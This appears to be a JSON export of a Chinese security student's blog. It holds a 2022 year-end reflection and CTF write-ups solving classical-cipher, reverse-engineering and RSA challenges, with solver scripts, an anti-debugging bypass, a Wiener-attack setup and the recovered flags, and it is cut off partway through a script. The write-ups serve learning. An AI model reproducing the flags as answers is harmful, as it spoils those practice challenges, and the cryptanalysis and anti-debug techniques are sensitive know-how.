{"pages":[],"posts":[{"title":"2022年度总结","text":"今天是2022年的最后一天，想好好写一个年度报告 写在前面非常感谢z1r0大师傅能让我接触到CTF与网络空间安全。 学习旅程 也是在1月份的时候，从z1r0师傅那边才知道还有CTF这样的比赛。当初学的方向是逆向，在寒假里面，好好的学了汇编，并且也刷了很多BUU逆向题，学到了很多。然后也跟着队伍一起打了一些比赛，这种在团队中一起努力的感觉很棒。当时就在学逆向和crypto方面，还去学了一段时间滴水的逆向课程(印象最深的就是海哥用汇编的角度讲c语言，画堆栈图)…… 但是感觉自己以小白的身份学逆向确实有些吃力，之前也从没干过开发。那个时候是五六月份，真的很迷茫，不知道自己下一步干什么，是考研还是就业，是在二进制还是web方面……。于是本着多开拓开拓视野，先好好接触web方面的想法，就去报了一些渗透课程跟着学，去学linux基操，学js，学php，学各种漏洞原理，学各种工具。 暑假结束回学校之后，就去学习了更多的web的知识，想当只web狗。10月份中旬，z1r0师傅的实验室下来了，队伍后面就一直在实验室里面学习，花了很多时间来通过ctfshow这个平台的由浅入深地来学习web方向的各个板块，系统的学习了命令执行，php特性，sql注入，xss，nodejs，代码审计等(当然还有很多很多领域没有学习)。每周写周报，每两周写知识分享。在创业园里面跟着大佬们学习，相比自己孤军奋战在宿舍里面学效率高很多，非常感谢z1r0、xiaoxing以及succ3大佬们的的鼓励与帮助orz!! 今年是刚刚接触网络安全的第一年，也仅仅只是较广泛的接触了一些方向，并且很多都是跟着感觉走。还是对网络安全方向抱有很多的热情，打算明天花一整年的时间好好复习考研，继续向网络空间安全专业方向靠拢。(自己是数字媒体技术专业的，真可谓是与其”毫不相干”orz) 一些想法 只有心情好，做事才有效率 由于去年的一些情感创伤没有处理好，也无法去解决。在今年的整个过程学习中，能一直都被干扰到，消极悲观出现的次数非常多。我也一再地感觉自己得了抑郁，有时候连续几天都是混乱与自闭的状态。我很感激垚垚领先能在我难过的时候和我谈话，感谢z1r0师傅与整个团队的带给我的积极乐观向上的力量，让我能暂时忘掉烦恼。 不要害怕试错，不要想得太多 收藏家的思维不能有 今年也一直在收藏各种学习资料，但是有些东西放网盘里面，一放就是一辈子……很明显它只在我的网盘里面，没有到我的脑子里。 简单的事情多重复 明年的展望希望我经过一整年的复习，能有个满意的答卷。希望明年的你我都能前程似锦，美梦成真！！！","link":"/2022/12/31/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"},{"title":"BUU-crypto","text":"BUU-crypto [AFCTF2018]Morse 发现是十六进制的字符串 1234string = &quot;61666374667b317327745f73305f333435797d&quot;for i in range(0,len(string),2): _n = int(string[i]+string[i+1],16) print(chr(_n),end = &quot;&quot;) flag{1s’t_s0_345y} Unencodehttp://www.hiencode.com/uu.html 世上无难事（词频） oldfasion（词频） 提权的第一步（md5） flag{361756} 萌萌的八戒（猪圈） flag{whenthepigwanttoeat} 凯撒？替换？呵呵（词频） flag{substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake} [NPUCTF2020]Classical Cipher12345解密后的flag请用flag{}包裹压缩包密码：gsv_pvb_rh_zgyzhs对应明文： ***_key_** _****** http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/ 解完压缩包之后： 变异猪圈+动物 flag{classicalcode} md5 (md5)解决完回头看这一题，发现有人可以通过撞库的方法，搜索匹配的md5 https://shirong.ink/index.php/archives/682/ 1234567891011import requestsimport res=input('破解的md5：')url = 'https://md5.gromweb.com/?md5='+stry: r = requests.get(url,timeout=20) r.raise_for_status() r.encoding = r.apparent_encodingexcept: print('网络异常或页面未找到，请重试')print(re.findall(r'&lt;em class=&quot;long-content string&quot;&gt;(.+?)&lt;/em&gt;&lt;/p&gt;',r.text)) 看一眼就解密（base64）1234import base64Crypto = &quot;ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=&quot;url = base64.b64decode(Crypto).decode(&quot;utf-8&quot;)print(url) 看我回旋踢 （凯撒加密）synt{5pq1004q-86n5-46q8-o720-oro5on0417r1} 暴力循环就好了 123456789101112131415string = list(&quot;synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}&quot;)for i in range(26): s = &quot;&quot; for j in string: m = ord(j)## if m &gt;= 65 and m &lt;= 90:## s += chr((m-65+i)%26+65) if m &gt;= 97 and m &lt;= 122: s += chr((m-97+i)%26+97) ## elif m &gt;= 48 and m &lt;= 57:## s += chr((m-48+i)%10+48) else: s += j print(s) 摩丝 (摩斯密码)1.. .-.. --- ...- . -.-- --- ..- 摩斯都是大写 摩斯解码脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from __future__ import print_functiona = input(&quot;input the string:&quot;)s = a.split(&quot; &quot;)dict = {'.-': 'A', '-...': 'B', '-.-.': 'C', '-..':'D', '.':'E', '..-.':'F', '--.': 'G', '....': 'H', '..': 'I', '.---':'J', '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O', '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T', '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y', '--..': 'Z', '.----': '1', '..---': '2', '...--': '3', '....-': '4', '.....': '5', '-....': '6', '--...': '7', '---..': '8', '----.': '9', '-----': '0', '..--..': '?', '-..-.': '/', '-.--.-': '()', '-....-': '-', '.-.-.-': '.' };for item in s: print (dict[item],end='')#print (s) password1234姓名：张三 生日：19900315key格式为key{xxxxxxxxxx} 好家伙，看长度有十位，生日八位，名字两位 flag{zs19900315}，出来了？！ 变异凯撒：12加密密文：afZ_r9VYfScOeO_UL^RWUc格式：flag{ } 知道格式是flag之后，我们可以对比一下对应的ascii码 123456789string = &quot;afZ_r9VYfScOeO_UL^RWUc&quot;flag = &quot;&quot;for j in range(len(string)): m = ord(string[j]) flag += chr(m+5+j) print(flag) Quoted-printable1=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6 12345# coding=gbkimport quopristr = '=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6'flag = quopri.decodestring(str).decode('utf8')print(flag) 当然也有脚本可以实现 rabbit 信息化时代的步伐 在网站找了半天有关36位的数字加密方法，可能没有注意关键词是中文加密吧…… 这个加密方法是电报加密 http://code.mcdvisa.com/ 丢失的MD5 在md5加密之前，需要将字符串编码一下 传统知识+古典密码 123辛卯，癸巳，丙戌，辛未， 庚辰，癸酉，己卯，癸巳 …… +甲子28 30 23 8 17 10 16 30 …… +60 X Z S D M F L Z 猜到是凯撒加密，但是解密后发现没有有用的信息 原来这题是栅栏加密+凯撒加密 原理： http://www.metools.info/code/fence154.html https://planetcalc.com/1434/","link":"/2022/03/01/BUU_crypto/BUU-crypto/"},{"title":"nullbook练习","text":"学习一下nullbook上的逆向题😊 reversebabyconst (md5加密)ida分析： 用findcrypt查看算法特征码，没有识别 跟进sub_40085B函数，发现有md5算法特征码 以及md5的加密算法 最后对比的也就是unk_603080数组了 shift+e提取数组，然后放在pycharm里面替换一下双引号，使十六进制数变成字符 12345678910111213141516171819202122232425262728encode = [ &quot;39&quot;, &quot;6D&quot;, &quot;F0&quot;, &quot;D2&quot;, &quot;42&quot;, &quot;41&quot;, &quot;F8&quot;, &quot;02&quot;, &quot;16&quot;, &quot;7A&quot;, \\ &quot;DC&quot;, &quot;C0&quot;, &quot;D6&quot;, &quot;10&quot;, &quot;6E&quot;, &quot;D3&quot;, &quot;FE&quot;, &quot;68&quot;, &quot;6F&quot;, &quot;27&quot;, \\ &quot;E9&quot;, &quot;00&quot;, &quot;81&quot;, &quot;6B&quot;, &quot;B2&quot;, &quot;B8&quot;, &quot;BC&quot;, &quot;63&quot;, &quot;D7&quot;, &quot;0D&quot;, \\ &quot;40&quot;, &quot;08&quot;, &quot;D2&quot;, &quot;CD&quot;, &quot;B7&quot;, &quot;10&quot;, &quot;60&quot;, &quot;4D&quot;, &quot;69&quot;, &quot;64&quot;, \\ &quot;A8&quot;, &quot;36&quot;, &quot;25&quot;, &quot;54&quot;, &quot;F7&quot;, &quot;DE&quot;, &quot;F0&quot;, &quot;96&quot;, &quot;DF&quot;, &quot;C4&quot;, \\ &quot;F8&quot;, &quot;47&quot;, &quot;AC&quot;, &quot;DE&quot;, &quot;92&quot;, &quot;AC&quot;, &quot;23&quot;, &quot;C4&quot;, &quot;69&quot;, &quot;4B&quot;, \\ &quot;EF&quot;, &quot;32&quot;, &quot;50&quot;, &quot;28&quot;, &quot;46&quot;, &quot;82&quot;, &quot;A2&quot;, &quot;4D&quot;, &quot;59&quot;, &quot;A9&quot;, \\ &quot;8E&quot;, &quot;7A&quot;, &quot;66&quot;, &quot;D8&quot;, &quot;E0&quot;, &quot;D3&quot;, &quot;1F&quot;, &quot;D9&quot;, &quot;BD&quot;, &quot;68&quot;, \\ &quot;46&quot;, &quot;04&quot;, &quot;F6&quot;, &quot;12&quot;, &quot;D8&quot;, &quot;A7&quot;, &quot;1D&quot;, &quot;EB&quot;, &quot;0D&quot;, &quot;FA&quot;, \\ &quot;03&quot;, &quot;5E&quot;, &quot;3F&quot;, &quot;06&quot;, &quot;A5&quot;, &quot;9B&quot;, &quot;99&quot;, &quot;AA&quot;, &quot;58&quot;, &quot;66&quot;, \\ &quot;28&quot;, &quot;D9&quot;, &quot;70&quot;, &quot;72&quot;, &quot;73&quot;, &quot;28&quot;, &quot;6B&quot;, &quot;4C&quot;, &quot;87&quot;, &quot;32&quot;, \\ &quot;DC&quot;, &quot;FF&quot;, &quot;A6&quot;, &quot;C9&quot;, &quot;FE&quot;, &quot;07&quot;, &quot;74&quot;, &quot;20&quot;, &quot;E1&quot;, &quot;DE&quot;, \\ &quot;FD&quot;, &quot;D7&quot;, &quot;C8&quot;, &quot;7B&quot;, &quot;59&quot;, &quot;CD&quot;, &quot;1D&quot;, &quot;73&quot;, &quot;CB&quot;, &quot;7F&quot;, \\ &quot;25&quot;, &quot;22&quot;, &quot;CC&quot;, &quot;3D&quot;, &quot;F2&quot;, &quot;0F&quot;, &quot;F2&quot;, &quot;98&quot;, &quot;7E&quot;, &quot;98&quot;, \\ &quot;42&quot;, &quot;7F&quot;, &quot;05&quot;, &quot;D2&quot;, &quot;BE&quot;, &quot;57&quot;, &quot;03&quot;, &quot;DD&quot;, &quot;22&quot;, &quot;DD&quot;, \\ &quot;C3&quot;, &quot;18&quot;, &quot;EA&quot;, &quot;07&quot;, &quot;24&quot;, &quot;80&quot;, &quot;44&quot;, &quot;D7&quot;, &quot;EC&quot;, &quot;CC&quot;, \\ &quot;FF&quot;, &quot;F5&quot;, &quot;6B&quot;, &quot;C4&quot;, &quot;60&quot;, &quot;70&quot;, &quot;DA&quot;, &quot;E9&quot;, &quot;F9&quot;, &quot;46&quot;, \\ &quot;6C&quot;, &quot;11&quot;, &quot;76&quot;, &quot;5D&quot;, &quot;0C&quot;, &quot;21&quot;, &quot;0E&quot;, &quot;49&quot;, &quot;91&quot;, &quot;A0&quot;, \\ &quot;2A&quot;, &quot;04&quot;, &quot;E4&quot;, &quot;21&quot;, &quot;84&quot;, &quot;9F&quot;, &quot;2A&quot;, &quot;B8&quot;, &quot;9B&quot;, &quot;7D&quot;, \\ &quot;9E&quot;, &quot;EA&quot;]string = &quot;&quot;arr = []for i in range(len(encode)): string += encode[i] if (i+1)%16 == 0: arr.append(string.lower()) string = &quot;&quot;print(arr) 推荐pmd5网站，cmd5一块一条…… babyalgo (RC4加密) 跟进sub_400874加密函数，可以看出加密方法是RC4，”Nu1Lctf233”是密钥 在这两个函数中都出现了sub_400646函数，等价于swap()函数 写个idapython的脚本，提取出加密后的数组 123456start_addr = 0x400925encode = []for i in range(44): encode.append(idc.get_wide_byte(start_addr+4*i+3))print(encode)# [198, 33, 202, 191, 81, 67, 55, 49, 117, 228, 142, 192, 84, 111, 143, 238, 248, 90, 162, 193, 235, 165, 52, 109, 113, 85, 8, 7, 178, 168, 47, 244, 81, 142, 12, 204, 51, 83, 49, 64, 214, 202, 236, 212] 刚开始发现出错了，到后面发现，ida里面的v8[39]没有给出…… 只能猜测，v8[39]的数字，随便带入了个0x40，离答案很近了 后面猜测为0，放到cyberchef里面，对了…… 下面是写的垃圾脚本…… 1234567arr = [198, 33, 202, 191, 81, 67, 55, 49, 117, 228, 142, 192, 84, 111, 143, 238, 248, 90, 162, 193, 235, 165, 52, 109, 113, 85, 8, 7, 178, 168, 47, 244, 81, 142, 12, 204, 51, 83, 49, 0, 64, 214, 202, 236, 212]h = &quot;&quot;for i in arr: h+=(hex(i)[2:].rjust(2,&quot;0&quot;))print(h)# c621cabf5143373175e48ec0546f8feef85aa2c1eba5346d71550807b2a82ff4518e0ccc3353310040d6caecd4# n1book{us1nG_f3atur3s_7o_de7erm1n3_4lg0ri7hm} BabyLib65537看起来有点像rsa 123456789101112from Crypto.Util.number import *import gmpy2# 98422105447041051053864602088923253415180232127076474506079092477911332645192005791731779124677858425580609684921867p = 9842210544704105105386460208892325341518023212707647450607909247791133264519200579173177912467785842558060968492186761162106356089009194470097546296829163q = 12972360952153818155692381381571252126631475184728971905301445264084096070607651598626783223094292740492828654265391639843199875189333033337169565006624907n = p * qe = 65537c = 110694010334901653238216140152683772418101197298114114481381418739511015861349388028360214495059500357527716613334520805339266807313669925649167175211788624655809951516502907329949137499677877779584898365309802983718066683849944838484002656376845311375573423677826690834875095904482448693671735053088583663382d = gmpy2.invert(e,(p-1)*(q-1))m = pow(c,d,n)print(long_to_bytes(m))# n1book{1d3nt1fy_GMp_l1br4ry}","link":"/2022/05/22/BUU-reverse/nullbook%E7%BB%83%E4%B9%A0/"},{"title":"2020_CISCN","text":"复现一下2020CISCN reversez3ida64打开之后，查看主函数 跟进byte_404020，以为就是前43个数据呢，后来构建z3的时候发现不对 动调了一下，发现最后对比的v47数组元素是2byte，word类型 上脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from z3 import *# lis ==\\# [\\# 0x17, 0x4F, 0x00, 0x00, 0xF6, 0x9C, 0x00, 0x00, 0xDB, 0x8D, \\# 0x00, 0x00, 0xA6, 0x8E, 0x00, 0x00, 0x29, 0x69, 0x00, 0x00, \\# 0x11, 0x99, 0x00, 0x00, 0xA2, 0x40, 0x00, 0x00, 0x3E, 0x2F, \\# 0x00, 0x00, 0xB6, 0x62, 0x00, 0x00, 0x82, 0x4B, 0x00, 0x00, \\# 0x6C, 0x48, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0xD7, 0x52, \\# 0x00, 0x00, 0xEF, 0x2D, 0x00, 0x00, 0xDC, 0x28, 0x00, 0x00, \\# 0x0D, 0x64, 0x00, 0x00, 0x8F, 0x52, 0x00, 0x00, 0x3B, 0x61, \\# 0x00, 0x00, 0x81, 0x47, 0x00, 0x00, 0x17, 0x6B, 0x00, 0x00, \\# 0x37, 0x32, 0x00, 0x00, 0x93, 0x2A, 0x00, 0x00, 0x5F, 0x61, \\# 0x00, 0x00, 0xBE, 0x50, 0x00, 0x00, 0x8E, 0x59, 0x00, 0x00, \\# 0x56, 0x46, 0x00, 0x00, 0x31, 0x5B, 0x00, 0x00, 0x3A, 0x31, \\# 0x00, 0x00, 0x10, 0x30, 0x00, 0x00, 0xFE, 0x67, 0x00, 0x00, \\# 0x5F, 0x4D, 0x00, 0x00, 0xDB, 0x58, 0x00, 0x00, 0x99, 0x37, \\# 0x00, 0x00, 0xA0, 0x60, 0x00, 0x00, 0x50, 0x27, 0x00, 0x00, \\# 0x59, 0x37, 0x00, 0x00, 0x53, 0x89, 0x00, 0x00, 0x22, 0x71, \\# 0x00, 0x00, 0xF9, 0x81, 0x00, 0x00, 0x24, 0x55, 0x00, 0x00, \\# 0x71, 0x89, 0x00, 0x00, 0x1D, 0x3A\\# ]#lis = [23, 79, 0, 0, 246, 156, 0, 0, 219, 141, 0, 0, 166, 142, 0, 0, 41, 105, 0, 0, 17, 153, 0, 0, 162, 64, 0, 0, 62, 47, 0, 0, 182, 98, 0, 0, 130, 75, 0, 0, 108, 72, 0]lis = [0x4f17,0x9cf6,0x8ddb,0x8ea6,0x6929,0x9911,0x40a2,0x2f3e,0x62b6,0x4b82,0x486c,0x4002,0x52d7,0x2def,0x28dc,0x640d,0x528f,0x613b,0x4781,0x6b17,0x3237,0x2a93,0x615f,0x50be,0x598e,0x4656,0x5b31,0x313a,0x3010,0x67fe,0x4d5f,0x58db,0x3799,0x60a0,0x2750,0x3759,0x8953,0x7122,0x81f9,0x5524,0x8971,0x3a1d]print(lis[:43])v5,v6,v7,v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18,v19,v20,v21,v22,v23,v24,v25,v26,v27,v28,v29,v30,v31,v32,v33,v34,v35,v36,v37,v38,v39,v40,v41,v42,v43,v44,v45,v46\\= Ints(&quot;v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18 v19 v20 v21 v22 v23 v24 v25 v26 v27 v28 v29 v30 v31 v32 v33 v34 v35 v36 v37 v38 v39 v40 v41 v42 v43 v44 v45 v46&quot;)s = Solver()s.add(34 * v8 + 12 * v5 + 53 * v6 + 6 * v7 + 58 * v9 + 36 * v10 + v11 == lis[0])s.add(27 * v9 + 73 * v8 + 12 * v7 + 83 * v5 + 85 * v6 + 96 * v10 + 52 * v11 == lis[1])s.add(24 * v7 + 78 * v5 + 53 * v6 + 36 * v8 + 86 * v9 + 25 * v10 + 46 * v11 == lis[2])s.add(78 * v6 + 39 * v5 + 52 * v7 + 9 * v8 + 62 * v9 + 37 * v10 + 84 * v11 == lis[3])s.add(48 * v9 + 14 * v7 + 23 * v5 + 6 * v6 + 74 * v8 + 12 * v10 + 83 * v11 == lis[4])s.add(15 * v10 + 48 * v9 + 92 * v7 + 85 * v6 + 27 * v5 + 42 * v8 + 72 * v11 == lis[5])s.add(26 * v10 + 67 * v8 + 6 * v6 + 4 * v5 + 3 * v7 + 68 * v11 == lis[6])s.add(34 * v15 + 12 * v12 + 53 * v13 + 6 * v14 + 58 * v16 + 36 * v17 + v18 == lis[7])s.add(27 * v16 + 73 * v15 + 12 * v14 + 83 * v12 + 85 * v13 + 96 * v17 + 52 * v18 == lis[8])s.add(24 * v14 + 78 * v12 + 53 * v13 + 36 * v15 + 86 * v16 + 25 * v17 + 46 * v18 == lis[9])s.add(78 * v13 + 39 * v12 + 52 * v14 + 9 * v15 + 62 * v16 + 37 * v17 + 84 * v18 == lis[10])s.add(48 * v16 + 14 * v14 + 23 * v12 + 6 * v13 + 74 * v15 + 12 * v17 + 83 * v18 == lis[11])s.add(15 * v17 + 48 * v16 + 92 * v14 + 85 * v13 + 27 * v12 + 42 * v15 + 72 * v18 == lis[12])s.add(26 * v17 + 67 * v15 + 6 * v13 + 4 * v12 + 3 * v14 + 68 * v18 == lis[13])s.add(34 * v22 + 12 * v19 + 53 * v20 + 6 * v21 + 58 * v23 + 36 * v24 + v25 == lis[14])s.add(27 * v23 + 73 * v22 + 12 * v21 + 83 * v19 + 85 * v20 + 96 * v24 + 52 * v25 == lis[15])s.add(24 * v21 + 78 * v19 + 53 * v20 + 36 * v22 + 86 * v23 + 25 * v24 + 46 * v25 == lis[16])s.add(78 * v20 + 39 * v19 + 52 * v21 + 9 * v22 + 62 * v23 + 37 * v24 + 84 * v25 == lis[17])s.add(48 * v23 + 14 * v21 + 23 * v19 + 6 * v20 + 74 * v22 + 12 * v24 + 83 * v25 == lis[18])s.add(15 * v24 + 48 * v23 + 92 * v21 + 85 * v20 + 27 * v19 + 42 * v22 + 72 * v25 == lis[19])s.add(26 * v24 + 67 * v22 + 6 * v20 + 4 * v19 + 3 * v21 + 68 * v25 == lis[20])s.add(34 * v29 + 12 * v26 + 53 * v27 + 6 * v28 + 58 * v30 + 36 * v31 + v32 == lis[21])s.add(27 * v30 + 73 * v29 + 12 * v28 + 83 * v26 + 85 * v27 + 96 * v31 + 52 * v32 == lis[22])s.add(24 * v28 + 78 * v26 + 53 * v27 + 36 * v29 + 86 * v30 + 25 * v31 + 46 * v32 == lis[23])s.add(78 * v27 + 39 * v26 + 52 * v28 + 9 * v29 + 62 * v30 + 37 * v31 + 84 * v32 == lis[24])s.add(48 * v30 + 14 * v28 + 23 * v26 + 6 * v27 + 74 * v29 + 12 * v31 + 83 * v32 == lis[25])s.add(15 * v31 + 48 * v30 + 92 * v28 + 85 * v27 + 27 * v26 + 42 * v29 + 72 * v32 == lis[26])s.add(26 * v31 + 67 * v29 + 6 * v27 + 4 * v26 + 3 * v28 + 68 * v32 == lis[27])s.add(34 * v36 + 12 * v33 + 53 * v34 + 6 * v35 + 58 * v37 + 36 * v38 + v39 == lis[28])s.add(27 * v37 + 73 * v36 + 12 * v35 + 83 * v33 + 85 * v34 + 96 * v38 + 52 * v39 == lis[29])s.add(24 * v35 + 78 * v33 + 53 * v34 + 36 * v36 + 86 * v37 + 25 * v38 + 46 * v39 == lis[30])s.add(78 * v34 + 39 * v33 + 52 * v35 + 9 * v36 + 62 * v37 + 37 * v38 + 84 * v39 == lis[31])s.add(48 * v37 + 14 * v35 + 23 * v33 + 6 * v34 + 74 * v36 + 12 * v38 + 83 * v39 == lis[32])s.add(15 * v38 + 48 * v37 + 92 * v35 + 85 * v34 + 27 * v33 + 42 * v36 + 72 * v39 == lis[33])s.add(26 * v38 + 67 * v36 + 6 * v34 + 4 * v33 + 3 * v35 + 68 * v39 == lis[34])s.add(34 * v43 + 12 * v40 + 53 * v41 + 6 * v42 + 58 * v44 + 36 * v45 + v46 == lis[35])s.add(27 * v44 + 73 * v43 + 12 * v42 + 83 * v40 + 85 * v41 + 96 * v45 + 52 * v46 == lis[36])s.add(24 * v42 + 78 * v40 + 53 * v41 + 36 * v43 + 86 * v44 + 25 * v45 + 46 * v46 == lis[37])s.add(78 * v41 + 39 * v40 + 52 * v42 + 9 * v43 + 62 * v44 + 37 * v45 + 84 * v46 == lis[38])s.add(48 * v44 + 14 * v42 + 23 * v40 + 6 * v41 + 74 * v43 + 12 * v45 + 83 * v46 == lis[39])s.add(15 * v45 + 48 * v44 + 92 * v42 + 85 * v41 + 27 * v40 + 42 * v43 + 72 * v46 == lis[40])s.add(26 * v45 + 67 * v43 + 6 * v41 + 4 * v40 + 3 * v42 + 68 * v46 == lis[41])s.check()print(s.model()) 123456arr = [102,108,97,103,123,55,101,49,55,49,100,52,51,45,54,51,98,57,45,52,101,49,56,45,57,57,48,101,45,54,101,49,52,99,50,97,102,101,54,52,56,125]flag = &quot;&quot;for i in arr: flag += chr(i)print(flag)# flag{7e171d43-63b9-4e18-990e-6e14c2afe648} hyperthreading用ida打开查看，可以可以看到最后的加密函数， 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp){ int i; // eax char v5; // [esp+0h] [ebp-14h] HANDLE Handles[2]; // [esp+8h] [ebp-Ch] BYREF sub_401020(&quot;plz input your flag:&quot;, v5); sub_401050(&quot;%42s&quot;, (char)byte_40336C); Handles[0] = CreateThread(0, 0, StartAddress, 0, 0, 0); Handles[1] = CreateThread(0, 0, loc_401200, 0, 0, 0); CreateThread(0, 0, sub_401240, 0, 0, 0); WaitForMultipleObjects(2u, Handles, 1, 0xFFFFFFFF); for ( i = 0; i &lt; 42; ++i ) { if ( byte_40336C[i] != byte_402150[i] ) { sub_401020(&quot;error&quot;, (char)Handles[0]); exit(0); } } sub_401020(&quot;win&quot;, (char)Handles[0]); getchar(); return 0;} 一共创建了三个线程，第一个线程的函数就是加密函数了，本人目前水平只能做到这样的修复了。 12345678910111213141516171819202122232425void __userpurge __noreturn StartAddress(_BYTE *a2@&lt;edi&gt;, LPVOID lpThreadParameter){ int *v2; // ebp int v3; // ecx int v4; // [esp+4h] [ebp-14h] DWORD v5; // [esp+Ch] [ebp-Ch] HANDLE Thread; // [esp+10h] [ebp-8h] int savedregs; // [esp+18h] [ebp+0h] BYREF v2 = &amp;savedregs; Thread = CreateThread(0, 0, hHandle, 0, 0, 0); v5 = WaitForSingleObject(hHandle, 0xFFFFFFFF); *(v5 - 57) = __ROR1__(*(v5 - 57), 69); while ( 1 ) { LOBYTE(v3) = v3 - *a2; v2 = (v2 - 1); byte_40336C[*(v2 - 1)] = (byte_40336C[*(v2 - 1)] &lt;&lt; 6) ^ (byte_40336C[v3] &gt;&gt; 2); byte_40336C[*(v2 - 1)] ^= 0x23u; Sleep(6u); v4 += NtCurrentPeb()-&gt;BeingDebugged + 9; *(v4 - 117) = __ROR1__(*(v4 - 117), 77); byte_40336C[*(v2 - 1)] = byte_40336C[v3] + 0x23; }} 查看第二个线程中的函数 123456789101112131415DWORD __thiscall sub_401200(char *this, LPVOID lpThreadParameter){ struct _PEB *v2; // eax int v3; // eax char v4; // bl v2 = NtCurrentPeb(); HIBYTE(v2-&gt;Ldr) = __ROR1__(HIBYTE(v2-&gt;Ldr), 182); v3 = 0; v4 = 100 * (*(this - 1240466363) + (_BYTE)this); do byte_40336C[v3++] += v4; while ( v3 &lt; 42 ); return 0;} 第三个线程中的函数 123456789void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter){ char v1; // [esp+0h] [ebp-4h] while ( !IsDebuggerPresent() ) ; sub_401020(&quot;debug!\\n&quot;, v1); exit(0);} 后面跟着一个函数WaitForMultipleObjects函数，中间存放的函数是一二线程： 贴上大佬的讲解 网上关于这题的wp挺少，据我统计共有两种做法。 方法一一种是直接读汇编，或者修补程序，把加密函数逆出来。加密函数逻辑大概就是这个样子。 1(((((input[i]&gt;&gt;2)^(input[i]&lt;&lt;6))&amp;0xff)^0x23)+0x23)&amp;0xff 最后把对比数组提取出来： 12345678910import stringans=[0xDD,0x5B,0x9E,0x1D,0x20,0x9E,0x90,0x91,0x90,0x90,0x91,0x92,0xDE,0x8B,0x11,0xD1,0x1E,0x9E,0x8B,0x51,0x11,0x50,0x51,0x8B,0x9E,0x5D,0x5D,0x11,0x8B,0x90,0x12,0x91,0x50,0x12,0xD2,0x91,0x92,0x1E,0x9E,0x90,0xD2,0x9F]flag='' for i in range(len(ans)): for c in string.printable: if (((((ord(c)&gt;&gt;2)^(ord(c)&lt;&lt;6))&amp;0xff)^0x23)+0x23)&amp;0xff==ans[i]: flag+=c breakprint (flag) 不得不说，这段爆破代码实在太强了，又学到了…… 代码来源 方法二读懂程序的逻辑，巧妙绕过第三个线程的isdebugged函数 用od动调，输入字符串之后，动调到WaitForMultipleObjects的时候，程序会自动卡在这个位置上，因为前面判断了程序处于调试模式，所以线程会一直占用，出不来。我们只需要手动暂停调试的程序，等待上面线程没有占用资源之后，再继续执行，之后就会绕过WaitForMultipleObjects函数了。从而到达关键判断处了 因为加密方式未知，这种做法有赌的成分…… 这题是简单的异或之类的字符加密，每个字符加密结果固定，所以可以统计每个常见字符对应的加密结果，然后通过对比数组，来推断出flag. 详细看这里 Cryptorsa12345# 小明经过研究，发现RSA加密算法可以推广，也就是它的模不仅仅是只能为两个素数的乘积，只要是2个以上不同的素数相乘都可以。n = 50142032499469550407421604706771611415193641755639270667473328045908799316205905505167271138079522738272643811917325451177986948493659090203974349370248583120022500722759239305447823602875823849366662503027591858371125301505134216095903796534740686834236150999e = 65537c = 45005399504992587510006608300548120810512973768886391125598523343330913326304417790989607300367232977960116381108873363343598357102136548218343380795022179607741940866191404186680657699739176842869814452906110393321567314747096161480003824583613027819960172221 分解出了三个大素数？？ 123456789101112import gmpy2from Crypto.Util.number import *n = 50142032499469550407421604706771611415193641755639270667473328045908799316205905505167271138079522738272643811917325451177986948493659090203974349370248583120022500722759239305447823602875823849366662503027591858371125301505134216095903796534740686834236150999p1 = 368751654879714877087975516875168751974879716873087714877516875971487715687516888458327p2 = 368751654879714877087975516875168751974879716873087714877516875971487715687518277898523p3 = 368751654879714877087975516875168751974879716873087714877516875971487715687518438089619c = 45005399504992587510006608300548120810512973768886391125598523343330913326304417790989607300367232977960116381108873363343598357102136548218343380795022179607741940866191404186680657699739176842869814452906110393321567314747096161480003824583613027819960172221e = 65537d = gmpy2.invert(e,(p1-1)*(p2-1)*(p3-1))m = pow(c,d,n)print(long_to_bytes(m)) bd （rsa-wiener-attack）1234567891011121314151617181920212223from secret import flagfrom Crypto.Util.number import *m = bytes_to_long(flag)p = getPrime(512)q = getPrime(512)N = p * qphi = (p-1) * (q-1)while True: d = getRandomNBitInteger(200) if GCD(d, phi) == 1: e = inverse(d, phi) breakc = pow(m, e, N)print(c, e, N, sep='\\n')# 37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066# 46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249# 86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289 这题给出的e很大，d是随机生成的，位数为200bit，且满足与phi互质的条件，我目前只能知道的条件为ed = 1 MOD phi –正解– 这题使用的方式是rsa-wiener-attack，有关连分数攻击方法 使用的脚本https://github.com/pablocelayes/rsa-wiener-attack 123456789101112131415161718192021222324252627from Crypto.Util.number import *from Crypto.PublicKey import RSAimport ContinuedFractions, 